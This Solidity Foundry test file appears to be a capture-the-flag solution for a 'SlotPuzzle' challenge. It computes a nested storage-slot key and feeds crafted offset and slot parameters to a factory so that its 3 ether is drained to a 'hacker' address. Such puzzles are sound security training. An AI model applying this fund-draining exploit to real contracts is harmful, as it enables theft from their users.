// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";

import {SlotPuzzle} from "../src/SlotPuzzle.sol";
import {SlotPuzzleFactory} from "../src/SlotPuzzleFactory.sol";
import {Parameters, Recipients} from "../src/ISlotPuzzleFactory.sol";

contract SlotPuzzleTest is Test {
    SlotPuzzle public slotPuzzle;
    SlotPuzzleFactory public slotPuzzleFactory;
    address hacker;
    address sender;
    function setUp() public {
        sender = msg.sender;
        slotPuzzleFactory = new SlotPuzzleFactory{value: 3 ether}();
        hacker = makeAddr("hacker");
    }

    function testHack_Slot() public {
        vm.startPrank(hacker, hacker);
        bytes32 slotKey = keccak256(
            abi.encode(
                keccak256(
                    abi.encode(
                        address(
                            uint160(
                                uint256(blockhash(block.number - block.basefee))
                            )
                        ),
                        keccak256(
                            abi.encode(
                                block.chainid,
                                bytes32(
                                    uint256(
                                        keccak256(
                                            abi.encode(
                                                block.coinbase,
                                                keccak256(
                                                    abi.encode(
                                                        block.prevrandao,
                                                        bytes32(
                                                            uint256(
                                                                keccak256(
                                                                    abi.encode(
                                                                        address(
                                                                            slotPuzzleFactory
                                                                        ),
                                                                        keccak256(
                                                                            abi
                                                                                .encode(
                                                                                    block
                                                                                        .timestamp,
                                                                                    bytes32(
                                                                                        uint256(
                                                                                            keccak256(
                                                                                                abi
                                                                                                    .encode(
                                                                                                        block
                                                                                                            .number,
                                                                                                        keccak256(
                                                                                                            abi
                                                                                                                .encode(
                                                                                                                    hacker,
                                                                                                                    uint256(
                                                                                                                        1
                                                                                                                    )
                                                                                                                )
                                                                                                        )
                                                                                                    )
                                                                                            )
                                                                                        ) +
                                                                                            1
                                                                                    )
                                                                                )
                                                                        )
                                                                    )
                                                                )
                                                            ) + 1
                                                        )
                                                    )
                                                )
                                            )
                                        )
                                    ) + 1
                                )
                            )
                        )
                    )
                )
            )
        );

        bytes32 value = vm.load(address(slotPuzzle), slotKey);
        emit log_named_bytes32("value : ", slotKey);
        console2.logBytes32(value);

        Recipients[] memory data = new Recipients[](3);
        data[0] = Recipients(address(hacker), 1 ether);
        data[1] = Recipients(address(hacker), 1 ether);
        data[2] = Recipients(address(hacker), 1 ether);
        Parameters memory param = Parameters({
            totalRecipients: 3,
            offset: 452,
            recipients: data,
            slotKey: abi.encode(slotKey, uint256(0x124))
        });

        slotPuzzleFactory.deploy(param);

        // assertEq(address(slotPuzzleFactory).balance, 3 ether, "weth contract should have 3 ether");

        // //hack time

        assertEq(
            address(slotPuzzleFactory).balance,
            0,
            "weth contract should have 0 ether"
        );
        assertEq(
            address(hacker).balance,
            3 ether,
            "hacker should have 3 ether"
        );

        vm.stopPrank();
    }
}
